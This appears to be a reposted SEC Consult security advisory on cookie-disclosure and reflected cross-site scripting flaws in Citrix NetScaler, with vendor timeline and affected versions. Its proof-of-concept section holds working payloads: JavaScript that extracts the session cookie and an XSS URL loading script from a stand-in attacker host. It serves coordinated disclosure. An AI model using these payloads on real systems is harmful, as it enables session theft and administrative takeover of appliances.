@@ -1,0 +1,142 @@
+id: 22445
+date: 07/17/2014
+title: Citrix Netscaler 9.3-62.4 Disclosure / Cross Site Scripting Vulnerabilities
+author: High-Tech Bridge
+cves: CVE-2014-4347
+
+product: Citrix NetScaler Application Delivery Controller
+Citrix NetScaler Gateway
+vulnerable version: <9.3-62.4
+<10.1-126.12
+fixed version: >=9.3-62.4
+>=10.1-126.12
+CVE: CVE-2014-4346, CVE-2014-4347
+impact: High
+homepage: http://www.citrix.com
+found: 2014-01-05
+by: Stefan Viehböck
+SEC Consult Vulnerability Lab
+https://www.sec-consult.com
+=======================================================================
+
+Vendor/product description:
+- -----------------------------
+"Citrix NetScaler helps organizations build enterprise cloud networks that
+embody the characteristics and capabilities that define public cloud services,
+such as elasticity, expandability and simplicity. NetScaler brings to
+enterprise IT leaders multiple advanced technologies that were previously
+available only to large public cloud providers."
+
+"As an undisputed leader of service and application delivery, Citrix NetScaler
+solutions are deployed in thousands of networks around the globe to optimize,
+secure and control the delivery of all enterprise and cloud services. They
+deliver 100 percent application availability, application and database server
+offload, acceleration and advanced attack protection. Deployed directly in
+front of web and database servers, NetScaler solutions combine high-speed load
+balancing and content switching, http compression, content caching, SSL
+acceleration, application flow visibility and a powerful application firewall
+into a single, easy-to-use platform."
+
+URL: http://www.citrix.com/products/netscaler-application-delivery-controller/overview.html
+
+
+Business recommendation:
+- ------------------------
+Attackers can exploit XSS and other vulnerabilities that lead to cookie disclosure
+to execute administrative actions.
+
+Affected Systems should be updated as soon as possible.
+
+
+Vulnerability overview/description:
+- -----------------------------------
+1) Cookie disclosure
+The error handler in the Apache g_soap module prints all of the request header
+information including the HTTP Cookie field. This vulnerability can be used in
+XSS attacks to gain access to the otherwise well protected (HttpOnly) "SESSID"
+cookie of an administrator.
+
+2) Reflected Cross-Site Scripting (XSS)
+Citrix Netscaler suffers from multiple reflected Cross-Site Scripting
+vulnerabilities, which allow an attacker to steal user information,
+impersonate users and perform administrative actions on the appliance.
+
+There are many parameters which are not properly sanitized and thus
+vulnerable to XSS.
+
+
+Proof of concept:
+- -----------------
+1) Cookie disclosure
+A GET request to the SOAP handler returns the following information:
+
+GET /soap HTTP/1.1
+Host: <host>
+*OTHER HEADER FIELDS*
+
+Response:
+HTTP/1.1 200 OK
+...
+Content-Type: text/html
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<HTML>
+...
+<BODY>
+<H1>mod_gsoap Apache SOAP Server Error</H1>
+<p><strong>No body received</strong>
+...
+<br>Cookie: SESSID=*SESSION ID*;
+...
+
+In combination with an XSS vulnerability (see 2) an attacker can use the following
+code to extract cookies including the SESSID cookie of an administrator:
+
+var request = new XMLHttpRequest();
+request.open('GET', '/soap', false);
+request.send();
+lines=request.responseText.split('<br>')
+for (var i in lines){
+if (lines[i].indexOf('Cookie')==0){
+alert(lines[i]);
+break;
+}
+}
+
+2) Reflected Cross-Site Scripting
+Accessing the following URL will include the Javascript code from http://evilattacker/evil.js:
+http://<host>/menu/topn?name=";<%2fscript><script+src%3d"http:%2f%2fevilattacker%2fevil.js"
+;><%2fscript>
+
+Other pages do not sanitize user input properly as well:
+http://<host>/pcidss/launch_report?type=AA";alert('xss');x="
+
+http://<host>/menu/guiw?nsbrand=AA<"'>AA&protocol=BB<"'>BB&id=CC<"'>CC
+Note: Content-Type is application/x-java-jnlp-file, so the injected script code
+is not interpreted. However, it is possible to inject arguments into a Java
+JNLP file, which might be used in further attacks.
+
+
+Vulnerable / tested versions:
+- -----------------------------
+The vulnerabilities have been verified to exist in Citrix NetScaler VPX 10.0,
+which was the most recent version at the time of discovery.
+According to the vendor versions before 10.1-126.12 and 9.3-62.4 are vulnerable
+
+
+Vendor contact timeline:
+- ------------------------
+2014-01-09: Sending advisory and proof of concept exploit via encrypted
+channel.
+2014-01-17: Vendor acknowledges receipt of advisory.
+2014-04-04: Requesting status update.
+2014-06-10: Vendor is "in the process of scheduling the release of a security
+bulletin".
+2014-07-07: Requesting list of affected/non-affected versions CVE-IDs.
+2014-07-07: Vendors is "still in the final stages of releasing the bulletin".
+2014-07-07: Requesting info about cause of delay.
+2014-07-07: Vendor is "still hopeful that the bulletin will be available soon".
+2014-07-14: Vendor states that fixed version will be available on July 15/16.
+2014-07-16: SEC Consult releases coordinated security advisory.
+
+#  0day.today [2023-03-27]  #
